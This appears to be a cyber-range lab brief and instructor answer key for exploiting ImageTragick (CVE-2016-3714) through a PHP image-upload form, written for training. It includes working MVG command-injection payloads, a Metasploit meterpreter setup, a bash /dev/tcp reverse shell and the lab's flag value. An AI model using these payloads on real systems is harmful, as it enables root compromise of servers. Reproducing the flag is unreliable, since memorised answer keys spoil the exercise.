# Indianapolis Student Brief

## General Instructions

On this subnet, `.254` is the lab router and is out of bounds.

The following docker containers are available to you as pre-installed tools helpful for the labs. Additional details are in the README.txt file on the Kali desktop.

- JavaChains

## Assigned Subnet

`192.168.19.0/24`

## Objective

From your assigned operations station, discover the host on the assigned subnet, gain appropriate access, and collect the flag.

The flag is obvious once you reach it. It is not intentionally hidden or obfuscated.

## Deliverable

Record the flag value for Indianapolis.

## PCTE range limitations

These limits apply on Persistent Cyber Training Environment (PCTE) ranges used by this Module. Treat the items below as a no-strike list when they exist. Not every item is present on every range or host.

Do not target, block, terminate, or delete range-control artifacts:

- **Network:** `10.0.0.0/8` (range control and instrumentation; do not block or flag that traffic). Routers past the edge-router in grey space. TCP `5672` (AMQP user-emulation on the control subnet), `49998`, and `49999`.
- **Accounts:** `range-admin` / `range_admin`, `range-control`, and `range`. Do not use accounts whose username or password contains `simspace`.
- **User emulation:** do not stop it. Typical paths: `C:\Program Files (x86)\Simspace\` and `C:\Users\<Username>\Simspace`. Scripts: `run-actuation.cmd`, `ueactuation.cmd`.
- **Directories:** `C:\Program Files\Puppet Labs` and the Simspace paths above.
- **Processes:** `java.exe`, `javaw.exe`, `ruby.exe`, `rubyw.exe`, `start.exe`, `chromedriver.exe`, `IEDriverServer.exe`, Metova, Selenium, WebDriver.

# Indianapolis — Instructor Answer Key

## Objective and starting context

Students start on the assigned operations station with only the city codename and subnet `192.168.19.0/24`. They must discover the live host, gain access, and recover the flag. The live instructor walkthrough is in this file.

Do not give students the service name, CVE, or host IP.

## Flag / reference table

|Item|Value|
|---|---|
|City|Indianapolis|
|Assigned subnet|`192.168.19.0/24`|
|Deploy flag key|`T10_FLAG`|
|Default flag|`silver-osprey`|
|Flag location on target|`/flag.txt` after access|

Rotate `T10_FLAG` in `environments/pcte_vulnhub_targets/.env` and restart the matching container when the class needs a new value. Grade against the live `.env` value, not only the default in this table.

## Initial situational awareness

Establish ops-station context before touching the assigned subnet. These commands are first-use literacy for this Module: run the full set, then interpret.

```
date -u
hostname
whoami
id
pwd
echo "$SHELL"
uname -a
cat /etc/os-release
who
w
ps aux
ss -tulpen
ss -tunap
ip a
ip -4 route
```

Why this matters:

- `date -u` and `hostname` fix remote time and host identity before any later log or packet evidence.
- `whoami`, `id`, `pwd`, and `echo "$SHELL"` lock user, session, and interpreter context.
- `uname -a` and `/etc/os-release` capture OS/runtime version.
- `who` / `w` and `ps aux` show active users and a process baseline.
- `ss -tulpen` (listeners) and `ss -tunap` (active sockets) give the required TCP+UDP picture.
- `ip -4 route` and `ip route get 192.168.19.10` show that the assigned subnet is already reachable via the default gateway.

Expected findings:

- The student is on the operations station (hostname `ops`), not on the city target. The shell is `zsh`.
- `ip -4 addr` shows the lab-facing address on `eth1` (this deployment: `172.16.123.100/24`). The `eth0` address `10.10.123.100/16` is not the path to this city subnet.
- `ip route get 192.168.19.10` uses the default gateway (this deployment: `via 172.16.123.253 dev eth1 src 172.16.123.100`). Do not add a route via `192.168.100.254`. That next hop does not answer, and a more-specific route would hide the working default path.
- Listening sockets on the ops station are local tooling, not the target. `ss` shows SSH and the local JavaChains listener on `8011/tcp`.

## Instructor live walkthrough

### Objective and starting context

Live instructor demo for the Indianapolis Module (`B02.M09`). Students know only the assigned subnet `192.168.19.0/24`. On this range, `.254` is the lab router on the segment and is out of bounds. Do not open with the product name, CVE, or host IP.

This walkthrough is rewritten onto the `192.168.19.0/24` student-facing range. Example host addresses in later steps use the `.10` (and, where present, `.11`) convention from the shared stack; treat those as discovered values, not pre-briefed facts.

The deploy flag key is `T10_FLAG`. Confirm the live `.env` value before grading.

### Required Tools

- `iproute2` (for `ip route get`. This ops station already has a path, so do not add a static route)
- `nmap` (for host discovery and port scanning)
- `curl` (HTTP headers and optional multipart uploads)
- a web browser (same uploads via the form on port 8080 — often the more natural path)
- `imagemagick` (`convert` / `identify` — optional; any tool that can create tiny PNG/GIF/JPG files works)
- `nc` (Netcat, for catching the reverse shell)
- `metasploit-framework` (section 4 — local ImageTragick fileformat module, then upload the generated file)

### 1. Network Routing & Host Discovery

At the start of this scenario, we only know the target subnet: `192.168.19.0/24`. The operations station is on `172.16.123.0/24` (`eth1`). The city subnet is reached through the default gateway.

Confirm the path before scanning. `ip route get` prints the next hop and the source address the kernel will use:

```
ip route get 192.168.19.10
```

_Output:_

```
192.168.19.10 via 172.16.123.253 dev eth1 src 172.16.123.100 uid 1000
    cache
```

**Observation:** The subnet is already reachable. The source address is `172.16.123.100`.

**Inference:** Do not run `ip route add 192.168.19.0/24 via 192.168.100.254`. `192.168.100.254` does not answer on this range, and that more-specific route would override the working default path.

With connectivity available, find which addresses on the subnet actually answer. `nmap -sn` is a ping sweep: it checks host up/down and **does not** port-scan. That is cheaper than a full TCP scan of every IP, and we only have a subnet so far — we still need a live host before we care about services.

```
nmap -sn -n 192.168.19.0/24
```

_Why `-n`:_ skip reverse DNS. The ops station resolver (`172.16.123.253`) refuses DNS. Without `-n`, this sweep sits at full CPU and does not print hosts. With `-n`, the same sweep finishes in a few seconds.

_Output excerpt:_

```
Nmap scan report for 192.168.19.10
Host is up.
Nmap scan report for 192.168.19.254
Host is up.
```

**Observation:** Two hosts respond on this subnet. `192.168.19.1` does not.

**Inference:** The student brief marks `.254` as the lab router and out of bounds. Concentrate service enumeration on **192.168.19.10**.

### 2. Service Enumeration

We have a candidate IP. Next question: **what is listening, and what does it claim to be?** That takes a version scan, not another ping sweep.

```
nmap -Pn -sV -n -p- 192.168.19.10
```

_Why these options:_

- `-Pn` — skip nmap’s host-discovery probes. We already know `192.168.19.10` responded to `-sn`. This also keeps the scan going if the host later ignores ping but still serves TCP.
- `-n` — skip reverse DNS, same reason as the sweep. The resolver still refuses.
- `-sV` — version detection. An open port labeled only `http` is not enough; we need the product string (here, **PHP 7.0.33** CLI server).
- `-p-` — all 65535 TCP ports, not nmap’s default top 1000. A single missed listener would hide the whole attack surface. On this host the extra cost is small.

_Output excerpt:_

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    PHP cli server 5.5 or later (PHP 7.0.33-0)
```

**Observation:** A single open port — **8080/tcp** — fingerprinted as a PHP built-in / CLI server (PHP 7.0.33).

**Inference:** A conventional web upload or form app is likely. Fetch the page with response headers before assuming any image library is involved.

#### Initial Web Probing

nmap told us HTTP on **8080**. Confirm that with a normal GET — headers and the HTML form. This is ordinary recon `curl`, not an exploit.

```
curl -s -D - http://192.168.19.10:8080/ -o /tmp/t10-index.html | head -12
```

_Why this `curl`:_

- `-s` — silent; drop the progress meter.
- `-D -` — write response **headers** to stdout (`X-Powered-By`, status).
- `-o /tmp/t10-index.html` — write the **body** to a file.
- `| head -12` — only the first header lines.
- Use **`:8080`** because that is the listener nmap found (not 80).

You can also open `[http://192.168.19.10:8080/](http://192.168.19.10:8080/)` in a browser and view source; the form is the same.

_Header excerpt:_

```
HTTP/1.1 200 OK
Host: 192.168.19.10:8080
Connection: close
X-Powered-By: PHP/7.0.33-0+deb9u10
Content-type: text/html; charset=UTF-8
```

_Body:_

```
<form method="post" enctype="multipart/form-data">
    File: <input type="file" name="file_upload">
    <input type="submit">
</form>
```

**Observation:** A minimal multipart upload form with field name `file_upload`. No product banner names an image library.

**Inference:** The form itself does not prove how uploads are processed. Start with a non-image upload to learn the filter, then try common image types and watch the response.

#### Observing Upload Processing

The page is a normal HTML file picker (`enctype="multipart/form-data"`, field name `file_upload`). Browsing to `[http://192.168.19.10:8080/](http://192.168.19.10:8080/)`, choosing a file, and submitting is the usual way to use it. The `curl -F` lines below are the same POST for a copy-paste walkthrough (`-F` builds a multipart form field; `file_upload=` matches the input name; `@path` is the file). Prefer the browser when you are sitting at a GUI.

Start with a non-image upload. Create `/tmp/probe.txt`, then **browse to the form and upload it**, or:

```
printf 'hello\n' > /tmp/probe.txt
curl -s -F 'file_upload=@/tmp/probe.txt;filename=probe.txt' \
  http://192.168.19.10:8080/
```

_Output:_

```
Unsupported filetype uploaded.
```

**Observation:** `.txt` is rejected with an explicit filetype error.

**Inference:** The app enforces an allowlist (or denylist). A bare multipart upload form with no other UI strongly suggests image types next — try common extensions with **real** image bytes, not just renamed text.

A quick search for creating tiny test images turns up ImageMagick `convert` (any tool that writes a real PNG/GIF/JPG is fine):

```
convert -size 8x6 xc:blue  /tmp/sample.png
convert -size 8x6 xc:red   /tmp/sample.gif
convert -size 8x6 xc:green /tmp/sample.jpg
```

Upload each file through the **browser** (same form, three times), or loop `curl` so the three POSTs stay identical except for the extension — same idea as the T9 port loop:

```
for ext in png gif jpg; do
  echo "=== $ext ==="
  curl -s -F "file_upload=@/tmp/sample.${ext};filename=sample.${ext}" \
    http://192.168.19.10:8080/
  echo
done
```

_Output:_

```
=== png ===
Image size is: 8 x 6
=== gif ===
Image size is: 8 x 6
=== jpg ===
Image size is: 8 x 6
```

**Observation:** `.png`, `.gif`, and `.jpg` are accepted, and every response reports **`Image size is: 8 x 6`** — matching the images we created.

**Inference:** The server is not only storing uploads. It **parses** accepted files and returns width × height. That is image-processing behavior (commonly ImageMagick [`identify`](https://imagemagick.org/script/identify.php) or similar), not a static file drop.

Contrast with a non-image body under an allowed extension. Save `/tmp/fake.png` (text inside, `.png` name), then **upload it in the browser**, or:

```
printf 'not an image\n' > /tmp/fake.png
curl -s -F 'file_upload=@/tmp/fake.png;filename=sample.png' \
  http://192.168.19.10:8080/
```

_Output:_

```
Image size is:
```

**Observation:** The extension passes the filter, but dimensions are empty — the processor ran and failed to read geometry from the content.

**Inference:** Processing is content-aware. The response is the string `Image size is:` with dimensions on a real image and empty dimensions on text. Search from that output before trying another file format.

_Search:_ `ImageMagick identify "Image size is"`

That query matches ImageMagick [`identify`](https://imagemagick.org/script/identify.php) (commonly `-format '%w x %h'`). The same write-ups give a harmless confirmation: upload Magick Vector Graphics (MVG) under an allowed image filename. MVG is ImageMagick’s vector mini-language ([Magick Vector Graphics](https://imagemagick.org/script/mvg.php)).

#### Probing ImageMagick-Style Input

Upload that harmless MVG body with a `.gif` filename.

Write it to a file named with an allowed extension, then **browse and upload `test.gif`**, or POST the same bytes with `curl` (`@-` means stdin; `filename=test.gif` is what the PHP allowlist sees):

```
cat > /tmp/test.gif <<'EOF'
push graphic-context
viewbox 0 0 640 480
pop graphic-context
EOF
```

```
curl -s -F 'file_upload=@/tmp/test.gif;filename=test.gif;type=image/png' \
  http://192.168.19.10:8080/
```

_Output:_

```
Image size is: 640 x 480
```

**Observation:** The server returns `640 x 480` from the MVG `viewbox`, not from a raster file we uploaded. The parser understands vector directives such as `push graphic-context` and `viewbox`.

**Inference:** The harmless MVG body was parsed: `640 x 480` came from the `viewbox`, not from a raster. The same write-ups name the next step, an MVG `fill 'url(...)'` directive. That is the ImageTragick trigger.

The matching Vulhub reference for this lab target is `vulnhub/imagemagick/CVE-2016-3714/README.md` (the older `imagetragick` path redirects there).

### 3. Vulnerability Discovery

We now know:

- PHP upload form on **8080** (`file_upload`) with an extension allowlist (`.txt` rejected; `.png` / `.gif` / `.jpg` accepted)
- Accepted uploads are passed through an **`identify`-style** dimension probe
- MVG-style bodies are accepted when the filename ends in an allowed image extension such as `.gif`

Public write-ups of **ImageTragick ([CVE-2016-3714](https://nvd.nist.gov/vuln/detail/CVE-2016-3714))** describe insufficient filtering when ImageMagick passes filenames or URLs from crafted image content to delegate shell commands ([ImageTragick advisory](https://imagetragick.com/), [oss-security disclosure](https://www.openwall.com/lists/oss-security/2016/05/03/18)). MVG `fill 'url(...)'` directives are a common trigger path.

**Candidate selection:** Before trying generic PHP upload tricks (webshells, polyglots), test the ImageMagick delegate path first — we already have an `identify`-style response to MVG content, which is exactly the precondition in the public PoCs.

First confirm the PHP extension filter blocks a non-image name. Write the PoC to `exploit.mvg`, then **browse to the form and upload that file**, or:

```
cat > /tmp/exploit.mvg <<'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url("|id; " )'
pop graphic-context
EOF

curl -s -F 'file_upload=@/tmp/exploit.mvg;filename=exploit.mvg;type=text/plain' \
  http://192.168.19.10:8080/
```

_Output:_

```
Unsupported filetype uploaded.
```

_What we learned:_ the PHP layer checks the **filename extension** before ImageMagick sees the body. Use an allowed extension such as `.gif`, even when the body is MVG-style content — the same bypass noted on [imagetragick.com](https://imagetragick.com/) ("rename `exploit.mvg` to `exploit.jpg`").

#### Test the public PoC

Use the well-known public PoC pattern instead (Vulhub README / [ImageTragick PoCs](https://github.com/ImageTragick/PoCs)): upload MVG with an allowed image extension and inject a shell command through `fill 'url(...)'`.

Write that PoC to **`exploit.gif`** (allowed extension, MVG body). **Browse to the form and upload `exploit.gif`**, or:

```
cat > /tmp/exploit.gif <<'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url("|id > /var/www/html/proof.txt; " )'
pop graphic-context
EOF

curl -s -F 'file_upload=@/tmp/exploit.gif;filename=exploit.gif;type=image/gif' \
  http://192.168.19.10:8080/
```

_Output:_

```
Image size is: 640 x 480
```

Retrieve the proof file:

```
curl -s http://192.168.19.10:8080/proof.txt
```

_Output:_

```
uid=0(root) gid=0(root) groups=0(root)
```

**Observation:** The uploaded file was parsed by ImageMagick, the delegate command was invoked, and the injected command ran as root.

That confirms **CVE-2016-3714**. Section 4 uses Metasploit only to **build** a malicious image on Kali; you still upload it through the same form. Section 5 is a reverse shell without Metasploit.

### 4. Automated Path: Metasploit (fileformat → upload)

`search imagetragick` / `search cve:2016-3714` finds `exploit/unix/fileformat/imagemagick_delegate`. That module writes a malicious image **on the attacker machine**. It does not HTTP-POST to this PHP form. Generate the file, start a handler (the fileformat module sets `DisablePayloadHandler`, so it will not catch the callback itself), then upload `msf.png` through the **browser** or with `curl`.

```
msfconsole -q
```

```
msf6 > search imagetragick

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  --------  -----  -----------
   0  exploit/unix/fileformat/imagemagick_delegate     2016-05-03       excellent  No     ImageMagick Delegate Arbitrary Command Execution
```

```
msf6 > use exploit/unix/fileformat/imagemagick_delegate
msf6 exploit(unix/fileformat/imagemagick_delegate) > show targets

Exploit targets:
   Id  Name
   --  ----
   0   SVG file
   1   MVG file
   2   PS file
```

Target **0** is SVG, **1** is MVG (same vector as the public PoC), **2** is PostScript. The default `FILENAME` is **`msf.png`** for all of them — ImageMagick keys off file magic, not the extension, and `.png` already matches this form’s allowlist. Use TARGET **1**.

```
msf6 exploit(unix/fileformat/imagemagick_delegate) > set TARGET 1
msf6 exploit(unix/fileformat/imagemagick_delegate) > set payload cmd/unix/php/meterpreter/reverse_tcp
msf6 exploit(unix/fileformat/imagemagick_delegate) > set LHOST 172.16.123.100
msf6 exploit(unix/fileformat/imagemagick_delegate) > set LPORT 4444
msf6 exploit(unix/fileformat/imagemagick_delegate) > run
[+] msf.png stored at /home/kali/.msf4/local/msf.png
```

`LHOST` is the `src` address from `ip route get 192.168.19.10`. Do not use `192.168.100.1`. That address is not on this station.

Start the handler in another `msfconsole`, or `use exploit/multi/handler` in the same session after the file is written. Match payload, `LHOST`, and `LPORT` to the fileformat settings:

```
msf6 exploit(unix/fileformat/imagemagick_delegate) > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload cmd/unix/php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 172.16.123.100
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

Upload `/home/kali/.msf4/local/msf.png` through the form in a **browser**, or:

```
curl -s -F 'file_upload=@/home/kali/.msf4/local/msf.png;filename=msf.png;type=image/png' \
  http://192.168.19.10:8080/
```

_Handler excerpt:_

```
[*] Started reverse TCP handler on 172.16.123.100:4444
[*] Sending stage (45739 bytes) to 192.168.19.10
[*] Meterpreter session 1 opened (172.16.123.100:4444 -> 192.168.19.10:39298)

meterpreter > cat /flag.txt
silver-osprey
```

That is a complete automated path to the flag.

### 5. Manual Path: reverse shell

With command execution confirmed (`proof.txt` or the MSF session), you can also catch a bash reverse shell without Metasploit. Use your attacker IP on the lab-facing LAN (example `172.16.123.100`).

Start a Netcat listener:

```
nc -lvnp 4444
```

Write the MVG payload to `shell.gif` (unquoted heredoc so `$LHOST` / `$LPORT` expand), then **browse to the form and upload `shell.gif`**, or:

```
LHOST="172.16.123.100"   # src from: ip route get 192.168.19.10
LPORT="4444"

cat > /tmp/shell.gif <<EOF
push graphic-context
viewbox 0 0 640 480
fill 'url("|bash -c "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" & " )'
pop graphic-context
EOF

curl -s --max-time 15 -F 'file_upload=@/tmp/shell.gif;filename=shell.gif;type=image/gif' \
  http://192.168.19.10:8080/
```

The background `&` is important. It lets the delegate command return control while the reverse shell stays connected. `--max-time` keeps `curl` from hanging if the HTTP handler waits on the delegate.

Check your Netcat listener. You should receive a root shell:

```
listening on [any] 4444 ...
connect to [172.16.123.100] from (UNKNOWN) [192.168.19.10] 49804
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@6481627ff596:/var/www/html#
```

The source port and the container id in the prompt change across runs. The peer address is the city host. This is **remote code execution** as root through ImageMagick delegate command injection.

#### Failed Attempt: Reverse Shell Without Backgrounding

If you omit the trailing `&` from the injected command, the HTTP upload request may hang while the shell remains attached to the ImageMagick delegate process.

_What we learned:_ Keep the reverse shell backgrounded inside the injected command. Your Netcat listener is the interactive session; the `curl` terminal does not need to remain clean.

#### Failed Attempt: Overcomplicated Quoting

ImageTragick payloads are sensitive to local shell quoting, PHP multipart parsing, ImageMagick syntax, and delegate-shell parsing. If a payload fails silently, simplify it back to a one-command proof such as:

```
fill 'url("|id > /var/www/html/proof.txt; " )'
```

_What we learned:_ Prove command execution with a file write first, then move to the reverse shell once the delegate-injection syntax is correct.

### 6. Survey and Retrieve the Flag

With root shell access, read the flag directly from the container filesystem:

```
id
date -u
hostname
whoami
ip a
ip r
pwd
echo "$SHELL"
ps aux
uname -a
cat /etc/os-release
who
w
ss -tulpen
ss -tunap
find / -iname *flag.txt 2>/dev/null
cat /flag.txt
```

**Note:** ps and busybox are not installed on this device

_Output:_

```
silver-osprey
```

#### Fallback: No Interactive Shell

If a reverse shell does not connect, copy the flag into the web root. Save as `flagread.gif` and **upload it in the browser**, or:

```
cat > /tmp/flagread.gif <<'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url("|cp /flag.txt /var/www/html/flag.txt; " )'
pop graphic-context
EOF

curl -s -F 'file_upload=@/tmp/flagread.gif;filename=flagread.gif;type=image/gif' \
  http://192.168.19.10:8080/

curl -s http://192.168.19.10:8080/flag.txt
```

_Output:_

```
silver-osprey
```

Use the fallback only when an interactive shell is impractical. For this target, a shell is realistic and should be the preferred path.

Target 10 is complete.

## Troubleshooting / confirmation

- If the subnet does not respond, confirm the stack is up and `ip route get 192.168.19.10` still uses the default gateway. Do not add a route via `192.168.100.254`.
- If `nmap -sn` never prints hosts, rerun it with `-n`.
- If the session does not connect, set `LHOST` to the `src` address from `ip route get 192.168.19.10`, not `192.168.100.1`.
- If the recovered string does not match this table, read the live `T10_FLAG` from `.env` before marking the quiz wrong.
- If students name a CVE or product before they have service evidence, redirect them to host discovery and version output.
- The city subnet for this module is `192.168.19.0/24`. The ops-station address can change with DHCP; take `LHOST` from `ip route get`, not from a remembered `172.16.123.100`.

## Grading checkpoints

|Checkpoint|Acceptable evidence|
|---|---|
|Assigned subnet used|Student worked `192.168.19.0/24` (or the live remapped equivalent)|
|Host discovered|Live host identified from a subnet sweep, not from a handed IP|
|Access gained|Command or session evidence that reached the target filesystem|
|Flag submitted|Quiz value matches live `T10_FLAG` (default `silver-osprey`)|

Accept a correct live flag even if the student used a valid alternate exploit path. Do not award the quiz for a walkthrough dump without the flag.